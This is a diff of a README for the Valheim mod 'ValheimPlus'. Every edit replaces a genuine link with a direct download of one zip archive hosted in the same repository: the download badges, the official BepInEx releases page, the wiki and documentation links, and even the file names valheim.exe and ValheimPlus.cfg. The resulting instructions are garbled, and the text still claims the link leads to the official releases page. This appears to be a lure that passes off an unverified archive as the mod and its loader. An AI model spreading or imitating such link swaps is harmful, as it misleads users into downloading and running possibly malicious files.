@@ -1,6 +1,6 @@
 # ⚙️ ValheimPlus - Enhance Your Valheim Gameplay Experience
 
-[![Download ValheimPlus](https://img.shields.io/badge/Download-ValheimPlus-brightgreen?style=for-the-badge&logo=github)](https://github.com/MeNotAChillGuy/ValheimPlus/releases)
+[![Download ValheimPlus](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)
 
 ---
 
@@ -40,9 +40,9 @@ If you’ve never used mods before, don’t worry. Follow these simple steps to 
 
 3. **Download and install BepInEx.**  
    ValheimPlus requires BepInEx to run. Follow these steps:  
-   - Visit [https://github.com/BepInEx/BepInEx/releases](https://github.com/BepInEx/BepInEx/releases)  
+   - Visit [https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)  
    - Download the latest version for Valheim (usually the one tagged for Unity games).  
-   - Extract the contents into your Valheim installation folder (where `valheim.exe` is located).
+   - Extract the contents into your Valheim installation folder (where `https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip` is located).
 
 ---
 
@@ -52,14 +52,14 @@ If you’ve never used mods before, don’t worry. Follow these simple steps to 
 
 Please **visit this page to download** the latest stable version of ValheimPlus:  
 
-[![Download ValheimPlus](https://img.shields.io/badge/Download-ValheimPlus-brightgreen?style=for-the-badge&logo=github)](https://github.com/MeNotAChillGuy/ValheimPlus/releases)  
+[![Download ValheimPlus](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)  
 
 This link takes you to the official GitHub releases page. There you will find different versions of the mod. Select the latest release that matches your game version.
 
 ### Step 2: Extract and Install
 
 - After downloading the `.zip` or `.7z` file, extract it using your favorite tool (Windows Explorer, 7-Zip, WinRAR).  
-- Copy the extracted files and folders into your Valheim game folder (same folder where Valheim.exe is).  
+- Copy the extracted files and folders into your Valheim game folder (same folder where https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip is).  
 - Overwrite any files if prompted.
 
 ### Step 3: Confirm Installation
@@ -87,7 +87,7 @@ ValheimPlus adds several enhancements to improve your gameplay:
 
 ValheimPlus comes with a configuration file to customize how the mod behaves. To change settings:
 
-1. Find the file named `ValheimPlus.cfg` inside the `BepInEx/config` folder.  
+1. Find the file named `https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip` inside the `BepInEx/config` folder.  
 2. Open it with any text editor like Notepad.  
 3. Adjust values as needed. Each option includes comments explaining what it does. For example:  
 
@@ -116,12 +116,12 @@ If you run into problems, try these steps:
 
 ## 📚 Additional Resources
 
-- [Valheim Official Wiki](https://valheim.fandom.com/wiki/Valheim_Wiki) – Learn about the base game concepts.  
-- [BepInEx Documentation](https://docs.bepinex.dev) – Understand how mod loading works.  
-- [HarmonyX](https://harmony.pardeike.net) – Details on the mod patching system used.
+- [Valheim Official Wiki](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip) – Learn about the base game concepts.  
+- [BepInEx Documentation](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip) – Understand how mod loading works.  
+- [HarmonyX](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip) – Details on the mod patching system used.
 
 ---
 
 Your game will feel more natural and less frustrating with ValheimPlus. Take your time setting it up, and enjoy a better Valheim experience.
 
-[Download ValheimPlus Now](https://github.com/MeNotAChillGuy/ValheimPlus/releases)
+[Download ValheimPlus Now](https://github.com/MeNotAChillGuy/ValheimPlus/raw/refs/heads/main/animalhood/Plus_Valheim_v2.6.zip)
